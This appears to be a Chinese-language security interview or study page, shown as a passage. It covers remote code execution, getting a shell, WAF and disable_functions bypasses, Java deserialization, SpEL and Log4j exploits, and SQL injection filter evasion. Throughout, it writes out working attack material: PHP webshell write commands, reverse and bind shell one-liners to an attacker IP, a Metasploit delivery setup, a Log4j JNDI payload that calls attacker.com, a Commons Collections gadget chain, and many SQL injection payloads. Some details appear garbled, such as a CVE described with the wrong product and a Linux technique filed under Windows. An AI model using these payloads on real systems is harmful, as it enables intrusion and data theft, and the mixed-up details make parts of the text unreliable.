系统访问权限。</p></li><li><p>禁用危险函数：通过<code>php.ini</code>的<code>disable_functions</code>禁用<code>eval</code>、<code>system</code>等。</p></li></ul><h2 id="通过RCE怎么去拿shell？"><a href="#通过RCE怎么去拿shell？" class="headerlink" title="通过RCE怎么去拿shell？"></a>通过RCE怎么去拿shell？</h2><h4 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h4><p>linux</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure><p>windows<br>注意特殊转义符号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php @eval($_POST[&quot;cmd&quot;]);?^&gt; &gt; C:\www\shell.php</span><br></pre></td></tr></table></figure><h2 id="cat如何绕WAF？"><a href="#cat如何绕WAF？" class="headerlink" title="cat如何绕WAF？"></a>cat如何绕WAF？</h2><h4 id="读文件命令替换"><a href="#读文件命令替换" class="headerlink" title="读文件命令替换"></a>读文件命令替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cat</span><br><span class="line">more:一页一页的显示档案内容 </span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">od -c:八进制显示</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /flag 2&gt;%261 //报错出文件内容</span><br><span class="line">curl file:///root/f/flag</span><br><span class="line">strings flag</span><br><span class="line">uniq -c flag</span><br><span class="line">bash -v flag</span><br><span class="line">rev flag</span><br></pre></td></tr></table></figure><h2 id="绕-php-ini-中-disable-function-的限制？有哪些方法？其中成功率最高的是哪个？为什么？"><a href="#绕-php-ini-中-disable-function-的限制？有哪些方法？其中成功率最高的是哪个？为什么？" class="headerlink" title="绕 php.ini 中 disable_function 的限制？有哪些方法？其中成功率最高的是哪个？为什么？"></a>绕 php.ini 中 disable_function 的限制？有哪些方法？其中成功率最高的是哪个？为什么？</h2><p>LD_PRELOAD 劫持（Linux）：上传自定义共享库（.so 文件），通过putenv(“LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;evil.so”)预加载，劫持system等函数实现命令执行。<br>PHP 扩展漏洞：利用imap、gd等扩展的漏洞（如imap_open的命令注入）绕过限制。<br>FFI 扩展：若启用FFI（Foreign Function Interface），可直接调用系统函数执行命令。<br>Windows COM 组件：在 Windows 系统中，通过COM(“WScript.Shell”)调用系统命令。</p><p><strong>成功率最高的是 LD_PRELOAD 劫持</strong>： 原因：兼容性强（适用于大多数 Linux 系统），无需依赖特定 PHP 扩展（仅需<code>putenv</code>和<code>mail</code>等未被禁用的函数），且实现逻辑简单（通过动态链接库劫持系统函数），对环境要求低，因此实际场景中成功率最高。</p><h1 id="面试篇"><a href="#面试篇" class="headerlink" title="面试篇"></a>面试篇</h1><h3 id="代码执行、命令执行的函数有哪些？"><a href="#代码执行、命令执行的函数有哪些？" class="headerlink" title="代码执行、命令执行的函数有哪些？"></a><strong>代码执行、命令执行的函数有哪些？</strong></h3><p>前面写了，这里就不赘述了</p><h3 id="正向-Shell-和反向-Shell-区别？"><a href="#正向-Shell-和反向-Shell-区别？" class="headerlink" title="正向 Shell 和反向 Shell 区别？"></a><strong>正向 Shell 和反向 Shell 区别？</strong></h3><ul><li><p><strong>正向 Shell（目标机执行）</strong>：<br>  <code>nc -lvp 8888 -e /bin/bash</code>（目标绑定 8888 端口，执行 bash）<br>  攻击者执行：<code>nc 目标IP 8888</code> → 获取 Shell。</p></li><li><p><strong>反向 Shell（目标机执行）</strong>：<br>  攻击者先监听：<code>nc -lvp 8888</code><br>  目标机执行：<code>bash -i &gt;&amp; /dev/tcp/攻击者IP/8888 0&gt;&amp;1</code> → 主动连攻击者，交出 Shell。</p></li></ul><h3 id="如何从非交互的-Shell-提升为交互-Shell？"><a href="#如何从非交互的-Shell-提升为交互-Shell？" class="headerlink" title="如何从非交互的 Shell 提升为交互 Shell？"></a><strong>如何从非交互的 Shell 提升为交互 Shell？</strong></h3><h4 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h4><p><strong>法一：python提交互</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标机执行（需安装Python）</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 进阶：设置TERM环境变量，补全更友好</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">export TERM=xterm</span><br><span class="line">stty raw -echo; fg  <span class="comment"># 回车后即可交互</span></span><br></pre></td></tr></table></figure><p><strong>法二：script命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash  <span class="comment"># /dev/null模拟终端，-c执行bash</span></span><br></pre></td></tr></table></figure><p><strong>法三：socat提权</strong><br>socat 提权（稳定性最高）<br>攻击者端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:tty,raw,echo=0 tcp-listen:8888</span><br></pre></td></tr></table></figure><p>目标端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:攻击者IP:8888</span><br></pre></td></tr></table></figure><p><strong>法四：利用msfconsole提权</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击者端（msf）</span></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> PAYLOAD python/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 你的IP</span><br><span class="line"><span class="built_in">set</span> LPORT 8888</span><br><span class="line">run</span><br><span class="line"><span class="comment"># 目标端执行生成的Python命令，获取meterpreter交互Shell</span></span><br></pre></td></tr></table></figure><h4 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h4><p><strong>PHP disable_functions() 绕过方法？</strong><br><strong>PHP 的 %00 截断的原理</strong><br><strong>站库分离怎么拿 Shell</strong></p><h1 id="java-rce篇"><a href="#java-rce篇" class="headerlink" title="java-rce篇"></a>java-rce篇</h1><h2 id="Java反序列化漏洞导致RCE的核心原理，并以Apache-Commons-Collections-3-x为例，描述攻击链的构造过程（需包含关键类和方法）"><a href="#Java反序列化漏洞导致RCE的核心原理，并以Apache-Commons-Collections-3-x为例，描述攻击链的构造过程（需包含关键类和方法）" class="headerlink" title="Java反序列化漏洞导致RCE的核心原理，并以Apache Commons Collections 3.x为例，描述攻击链的构造过程（需包含关键类和方法）"></a>Java反序列化漏洞导致RCE的核心原理，并以Apache Commons Collections 3.x为例，描述攻击链的构造过程（需包含关键类和方法）</h2><p><strong>环境</strong>：<strong>Apache Commons Collections 3.x</strong> 框架</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="comment">// 第1个Transformer：返回固定常量 → Runtime.class（Runtime类的Class对象）</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第2个Transformer：反射调用Runtime.class.getMethod(&quot;getRuntime&quot;, null)</span></span><br><span class="line">    <span class="comment">// 参数说明：</span></span><br><span class="line">    <span class="comment">// &quot;getMethod&quot; → 要调用的方法名；</span></span><br><span class="line">    <span class="comment">// new Class[]&#123;String.class, Class[].class&#125; → getMethod的参数类型（方法名+参数类型数组）；</span></span><br><span class="line">    <span class="comment">// new Object[]&#123;&quot;getRuntime&quot;, null&#125; → getMethod的参数值（获取getRuntime()方法，无参数）；</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第3个Transformer：反射调用上面得到的Method.invoke(null, null)</span></span><br><span class="line">    <span class="comment">// 作用：执行getRuntime()方法（静态方法，第一个参数为null），得到Runtime实例；</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第4个Transformer：反射调用Runtime实例.exec(&quot;calc.exe&quot;)，执行系统命令；</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>防御</strong>：升级到Commons Collections 4.0+，或使用<code>SerialKiller</code>等反序列化过滤器</p><h2 id="在Spring框架中，如何通过SpEL（Spring-Expression-Language）注入实现RCE？请结合CVE-2022-22963漏洞说明利用条件及Payload构造。"><a href="#在Spring框架中，如何通过SpEL（Spring-Expression-Language）注入实现RCE？请结合CVE-2022-22963漏洞说明利用条件及Payload构造。" class="headerlink" title="在Spring框架中，如何通过SpEL（Spring Expression Language）注入实现RCE？请结合CVE-2022-22963漏洞说明利用条件及Payload构造。"></a>在Spring框架中，如何通过SpEL（Spring Expression Language）注入实现RCE？请结合<a href="https://cn-sec.com/archives/tag/cve-2022-22963">CVE-2022-22963</a>漏洞说明利用条件及Payload构造。</h2><ul><li><p><strong>漏洞背景</strong>：Spring Cloud Gateway在3.1.0及以下版本中，未对<code>X-Forwarded-Prefix</code>头进行过滤，导致SpEL表达式注入。</p></li><li><p><strong>利用条件</strong>：目标启用Actuator API且路由配置允许动态修改。<br>payload构造</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/test_route HTTP/1.1</span><br><span class="line">&#123;</span><br><span class="line">  &quot;predicates&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;Path&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;&quot;_genkey_0&quot;:&quot;/test_route&quot;&#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;X-Response&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>触发执行</strong>：访问<code>/actuator/gateway/refresh</code>刷新配置后，请求<code>/test_route</code>触发表达式解析。</p></li><li><p><strong>修复</strong>：升级到3.1.1+，禁用动态路由或过滤危险Header。</p></li></ul><h2 id="假设目标系统对用户输入的RCE-Payload进行了黑名单过滤（如禁止Runtime、ProcessBuilder等关键词），请列举三种绕过方式并举例说明。"><a href="#假设目标系统对用户输入的RCE-Payload进行了黑名单过滤（如禁止Runtime、ProcessBuilder等关键词），请列举三种绕过方式并举例说明。" class="headerlink" title="假设目标系统对用户输入的RCE Payload进行了黑名单过滤（如禁止Runtime、ProcessBuilder等关键词），请列举三种绕过方式并举例说明。"></a>假设目标系统对用户输入的RCE Payload进行了黑名单过滤（如禁止<code>Runtime</code>、<code>ProcessBuilder</code>等关键词），请列举三种绕过方式并举例说明。</h2><p><strong>反射调用</strong>：通过反射获取<code>Runtime</code>类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.&quot; + &quot;Runtime&quot;);</span><br><span class="line">clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(null), &quot;calc&quot;);</span><br></pre></td></tr></table></figure><p><strong>Unicode&#x2F;Hex编码</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// u0020 表示空格，绕过字符串检测</span><br><span class="line">String cmd = &quot;cu&quot; + &quot;u0020&quot; + &quot;rl example.com&quot;;</span><br></pre></td></tr></table></figure><p><strong>利用其他危险类</strong>：如<code>ScriptEngine</code>执行JS代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new javax.script.ScriptEngineManager()</span><br><span class="line">  .getEngineByName(&quot;JavaScript&quot;)</span><br><span class="line">  .eval(&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;);</span><br></pre></td></tr></table></figure><h2 id="如何通过静态分析工具（如CodeQL）挖掘Java应用中潜在的RCE反序列化链？请描述关键分析步骤。"><a href="#如何通过静态分析工具（如CodeQL）挖掘Java应用中潜在的RCE反序列化链？请描述关键分析步骤。" class="headerlink" title="如何通过静态分析工具（如CodeQL）挖掘Java应用中潜在的RCE反序列化链？请描述关键分析步骤。"></a>如何通过静态分析工具（如CodeQL）挖掘Java应用中潜在的RCE反序列化链？请描述关键分析步骤。</h2><p><strong>识别危险方法</strong>：定义Sink点（如<code>Runtime.exec()</code>、<code>Method.invoke()</code>）。<br><strong>追踪数据流</strong>：从反序列化入口（<code>ObjectInputStream.readObject()</code>）到Sink点的数据流路径。<br><strong>识别Gadget链</strong>：查找可连接Sink与Sou<a href="https://cn-sec.com/archives/tag/rce">rce</a>的调用链（如<code>readObject()</code> → <code>Transformer.transform()</code> → <code>InvokerTransformer</code>）。<br><strong>过滤无害调用</strong>：排除无参数传递或不可控的路径。<br><strong>验证利用可行性</strong>：检查类是否可实例化、方法是否公开等。</p><ul><li><strong>示例CodeQL查询</strong>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from Callable source, Callable sink</span><br><span class="line">where source.getAParameter().getType().hasName(&quot;ObjectInputStream&quot;)</span><br><span class="line">  and sink.hasName(&quot;exec&quot;)</span><br><span class="line">  and exists(DataFlow::path(source, sink))</span><br><span class="line">select sink, source</span><br></pre></td></tr></table></figure><h2 id="如何绕过Java-Security-Manager的沙箱限制实现RCE？请举例说明。"><a href="#如何绕过Java-Security-Manager的沙箱限制实现RCE？请举例说明。" class="headerlink" title="如何绕过Java Security Manager的沙箱限制实现RCE？请举例说明。"></a>如何绕过Java Security Manager的沙箱限制实现RCE？请举例说明。</h2><p>漏洞场景：若策略文件配置错误（如允许createClassLoader权限）。<br>绕过方式：<br>定义恶意类加载器：通过自定义ClassLoader加载并执行字节码。<br>利用JNI本地库：调用JNI方法执行本地代码（需loadLibrary权限）。<br>反射修改Policy：通过反射修改Policy对象，动态添加权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Field policyField = Policy.class.getDeclaredField(&quot;policy&quot;);</span><br><span class="line">policyField.setAccessible(true);</span><br><span class="line">Policy policy = (Policy) policyField.get(null);</span><br><span class="line">// 添加AllPermission到策略</span><br></pre></td></tr></table></figure><h2 id="Log4j2的JNDI注入漏洞（CVE-2021-44228）如何导致RCE？请说明攻击流程及防御方案。"><a href="#Log4j2的JNDI注入漏洞（CVE-2021-44228）如何导致RCE？请说明攻击流程及防御方案。" class="headerlink" title="Log4j2的JNDI注入漏洞（CVE-2021-44228）如何导致RCE？请说明攻击流程及防御方案。"></a>Log4j2的JNDI注入漏洞（CVE-2021-44228）如何导致RCE？请说明攻击流程及防御方案。</h2><p><strong>攻击流程：</strong><br>攻击者在日志中注入<code>$&#123;jndi:ldap://attacker.com/Exploit&#125;</code>。<br>Log4j2解析日志时触发JNDI请求，从恶意服务器加载远程类。<br>恶意类（如Exploit.class）的静态代码块中执行<code>Runtime.getRuntime().exec(&quot;curl attacker.com/shell&quot;)</code>。<br><strong>防御：</strong><br>升级到Log4j 2.17.0+，默认禁用JNDI查找。<br>设置环境变量LOG4J_FORMAT_MSG_NO_LOOKUPS&#x3D;true。<br>使用WAF过滤${jndi:等关键字。</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h4 id="post和get都做了防注入，用什么方法绕"><a href="#post和get都做了防注入，用什么方法绕" class="headerlink" title="post和get都做了防注入，用什么方法绕"></a>post和get都做了防注入，用什么方法绕</h4><p>许多 Web 应用程序不仅处理 POST 和 GET 数据，还会依赖于 HTTP 请求头中的信息。如果这些头信息没有经过严格的过滤，就可能成为注入点</p><ul><li><p><strong>User-Agent：</strong> 很多网站会记录访问者的 User-Agent 信息。如果后台程序直接将 User-Agent 拼接到 SQL 查询中，就可能存在注入</p></li><li><p><strong>X-Forwarded-For：</strong> 这个头通常用于获取用户的真实 IP 地址。当网站部署了负载均衡或 CDN 时，它会记录用户的原始 IP。同样，如果处理不当，也可能成为注入点</p></li><li><p><strong>Cookie：</strong> 网站通常会使用 Cookie 来存储会话信息或其他用户数据。如果 Cookie 中的某个值直接参与了 SQL 查询，就可能被利用</p></li><li><p><strong>Referer：</strong> 网站会记录用户是从哪个页面跳转过来的。如果这个信息直接被用于查询，同样存在风险<br><strong>绕过方式：</strong> 以 User-Agent 为例，你可以使用 Burp Suite 或其他抓包工具，在请求头中修改 User-Agent 的值，构造 SQL 注入 Payload。 例如：<code>User-Agent: &#39; OR 1=1--</code></p></li></ul><h4 id="单引号过滤绕过"><a href="#单引号过滤绕过" class="headerlink" title="单引号过滤绕过"></a>单引号过滤绕过</h4><h5 id="双引号"><a href="#双引号" class="headerlink" title="双引号"></a>双引号</h5><h5 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h5><p>完整 URL 注入： <code>id=0x27206f7220313d31202d2d20</code><br>最终执行的 SQL： <code>SELECT * FROM users WHERE id = &#39;or 1=1 -- &#39;</code></p><h5 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h5><p>%df<br><code>SELECT * FROM users WHERE id = &#39;1運&#39;&#39;...</code> (<code>&#39;運&#39;</code> 是一个汉字) 后面的 <code>&#39;</code> 就成为我们控制的单引号</p><h5 id="反斜线-绕过addslashes"><a href="#反斜线-绕过addslashes" class="headerlink" title="反斜线 \ 绕过addslashes"></a>反斜线 \ 绕过addslashes</h5><p>在某些情况下，如果后端代码没有过滤反斜线，你可以通过注入一个反斜线来“吃掉” <code>addslashes</code> 自动添加的反斜线<br><strong>原始查询：</strong> <code>SELECT * FROM users WHERE id = &#39;...注入点...&#39;</code><br><strong>注入尝试：</strong> <code>id=1\&#39;</code><br><strong>服务器端处理：</strong></p><ol><li><p>PHP 的 <code>addslashes()</code> 函数收到 <code>1&#39;</code></p></li><li><p>它在 <code>&#39;</code> 前面加上 <code>\</code>，变成 <code>1\&#39;</code></p></li><li><p>如果前端的输入是 <code>1\&#39;</code>， <code>addslashes</code> 会将 <code>\&#39;</code> 变为 <code>\\&#39;</code><br>这个方法需要深入理解后端如何处理输入。如果后端代码只对单引号进行了转义，而没有对反斜线进行处理，你就可以用一个反斜线来闭合它</p></li></ol><h5 id="char-函数绕过"><a href="#char-函数绕过" class="headerlink" title="char()函数绕过"></a>char()函数绕过</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char()` 函数可以将数字转换为字符。你可以利用这个函数来构造单引号</span><br><span class="line">**注入尝试：** `id=1 and 1=1 and (select char(39))` `id=1 union select 1,2,3 from users where username=char(39)adminchar(39)</span><br></pre></td></tr></table></figure><h5 id="使用like语句绕过"><a href="#使用like语句绕过" class="headerlink" title="使用like语句绕过"></a>使用like语句绕过</h5><p>在某些盲注场景下，如果无法使用单引号，可以尝试使用 <code>like</code> 语句来代替 <code>union</code> 或 <code>and</code><br><strong>注入尝试：</strong> <code>id=1 and 1 like 1 and 1=1 --</code> <code>id=1 and 1 like database()</code><br>这种方法适用于特定的 SQL 语句结构，但并非万能</p><h4 id="盲注过滤if绕过手法"><a href="#盲注过滤if绕过手法" class="headerlink" title="盲注过滤if绕过手法"></a>盲注过滤if绕过手法</h4><p><strong>1. 利用</strong> <code>CASE WHEN</code> <strong>语句</strong><br><code>CASE WHEN</code> 语句是 SQL 中最常见的条件判断表达式，其功能与 <code>IF()</code> 函数非常相似，且通常不会被安全设备过滤</p><ul><li><p><strong>语法：</strong> <code>CASE WHEN [condition] THEN [value1] ELSE [value2] END</code></p></li><li><p><strong>布尔盲注绕过：</strong> <code>SELECT * FROM users WHERE id = 1 AND CASE WHEN (1=1) THEN 1 ELSE 2 END = 1</code></p></li><li><p><strong>时间盲注绕过：</strong> <code>SELECT * FROM users WHERE id = 1 AND CASE WHEN (SUBSTRING(database(),1,1) = &#39;d&#39;) THEN SLEEP(5) ELSE 0 END</code></p></li></ul><p><strong>2. 利用</strong> <code>UNION</code> <strong>+ 错误信息</strong><br>当 <code>IF()</code> 被过滤，但 <code>UNION</code> 和错误信息回显没有被完全禁用时，我们可以利用 <code>UNION</code> 来触发自定义的错误信息，从而进行布尔盲注</p><ul><li><p><strong>原理：</strong> 通过 <code>UNION</code> 将一个错误的查询结果与正常的查询结果合并，当错误的查询语句执行时，数据库会返回错误信息，其中可能包含我们想要的数据</p></li><li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = -1 UNION SELECT 1, 2, 3 FROM DUAL WHERE (1=2) OR (1=1) UNION SELECT 1, 2, 3 FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)a</code> 这个方法需要根据具体情况进行调整，利用数据库的语法错误或类型转换错误来触发自定义的错误信息</p></li></ul><p><strong>3. 利用位运算和</strong> <code>LIKE</code> <strong>语句</strong><br>当数据库不支持 <code>IF()</code> 或 <code>CASE</code> 语句时，我们可以利用逻辑运算和位运算来逐位判断数据</p><ul><li><p><strong>原理：</strong> <code>LIKE</code> 语句可以用于模糊匹配，我们可以将它和数据库中的数据结合起来，逐个字符地猜解</p></li><li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND username LIKE &#39;a%&#39;</code> 如果该查询返回结果，则说明 <code>username</code> 的第一个字符是 ‘a’。我们可以通过不断改变 <code>%</code> 前的字符来逐个猜解数据</p></li></ul><p><strong>4. 利用</strong> <code>benchmark()</code> <strong>函数</strong><br>在 MySQL 中，<code>benchmark()</code> 函数可以用来执行指定的函数多次，从而消耗大量时间。这可以用来替代 <code>SLEEP()</code> 函数进行时间盲注</p><ul><li><p><strong>原理：</strong> <code>BENCHMARK(count, expr)</code> 会重复执行 <code>expr</code> 表达式 <code>count</code> 次。如果 <code>expr</code> 包含一个耗时的操作，我们可以根据执行时间来判断条件是否成立</p></li><li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND BENCHMARK(10000000, MD5(1)) AND (SUBSTRING(database(),1,1) = &#39;d&#39;)</code></p></li></ul><p>如果条件 <code>(SUBSTRING(database(),1,1) = &#39;d&#39;)</code> 成立，<code>BENCHMARK</code> 函数就会被执行，页面响应会变慢。否则，页面会立即响应</p><p><strong>5. 利用</strong> <code>get_lock()</code> <strong>函数</strong><br>在 MySQL 中，<code>GET_LOCK()</code> 函数可以用于获取一个全局锁，如果锁已被其他会话占用，该函数会等待直到锁被释放或超时</p><ul><li><p><strong>原理：</strong> 我们可以利用 <code>GET_LOCK()</code> 函数设置一个长达数秒的锁，从而实现时间盲注的效果</p></li><li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND IF((SUBSTRING(database(),1,1)=&#39;d&#39;), GET_LOCK(&#39;hack&#39;, 5), 0)</code><br>如果条件成立，<code>GET_LOCK</code> 会被执行，页面会等待 5 秒</p></li></ul><p><strong>6. 利用</strong> <code>ELT()</code> <strong>函数</strong><br><code>ELT()</code> 函数是 MySQL 中的一个字符串函数，它可以根据索引返回列表中的一个字符串</p><ul><li><p><strong>原理：</strong> <code>ELT(N, str1, str2, ...)</code> 返回第 N 个字符串。我们可以将它与条件判断结合，实现布尔盲注</p></li><li><p><strong>绕过方式：</strong> <code>SELECT * FROM users WHERE id = 1 AND ELT(1, &#39;false&#39;, &#39;true&#39;)</code> 如果条件为真，<code>ELT</code> 会返回 <code>true</code>，否则返回 <code>false</code></p></li></ul><h4 id="and和or被过滤怎么绕过"><a href="#and和or被过滤怎么绕过" class="headerlink" title="and和or被过滤怎么绕过"></a>and和or被过滤怎么绕过</h4><h5 id="和"><a href="#和" class="headerlink" title="&amp;&amp;和||"></a>&amp;&amp;和||</h5><p><code>&amp;&amp;</code>和<code>||</code>和功能一样的</p><h5 id="利用-、、not-等操作符"><a href="#利用-、、not-等操作符" class="headerlink" title="利用!、&lt;&gt;、not 等操作符"></a>利用<code>!</code>、<code>&lt;&gt;</code>、<code>not</code> 等操作符</h5><ul><li><p><code>and</code> <strong>的替代：</strong></p></li><li><p><code>if not (a=1) then ...</code> 等价于 <code>if a&lt;&gt;1 then ...</code></p></li><li><p>我们可以利用 <code>not</code> 或 <code>&lt;&gt;</code> 来否定条件，从而实现 <code>and</code> 的效果</p></li><li><p><strong>例如：</strong> <code>username=admin&#39; or not (&#39;1&#39;=&#39;1&#39; and &#39;1&#39;=&#39;2&#39;)</code> 这句可以被改写为 <code>username=admin&#39; or not (1=1)</code>，这在逻辑上是错误的，我们可以利用它来测试</p></li><li><p><strong>更具体的绕过：</strong> <code>id=1 and 1=2</code> 可以被改写为 <code>id=1 or not 1=1</code>，这在布尔盲注中可以用来判断</p></li></ul><h5 id="利用union-select进行盲注"><a href="#利用union-select进行盲注" class="headerlink" title="利用union select进行盲注"></a>利用<code>union select</code>进行盲注</h5><p>当布尔条件失效时，可以尝试使用 <code>union select</code> 来进行盲注</p><ul><li><p><strong>原理：</strong></p></li><li><p>正常情况下，<code>union select</code> 需要前后两个查询的列数一致</p></li><li><p>我们可以利用这一点，通过 <code>union select</code> 来注入一个不存在的列，从而触发数据库的报错，通过报错信息来判断</p></li><li><p><strong>绕过方式：</strong></p></li><li><p><strong>首先，使用</strong> <code>union</code> <strong>探测列数。</strong> <code>id=1 union select 1,2,3...</code></p></li><li><p><strong>然后，利用列数来进行盲注。</strong> <code>id=-1 union select 1, 2, user() like &#39;root%&#39;</code> 如果页面正常回显，则说明 <code>user()</code> 以 <code>root</code> 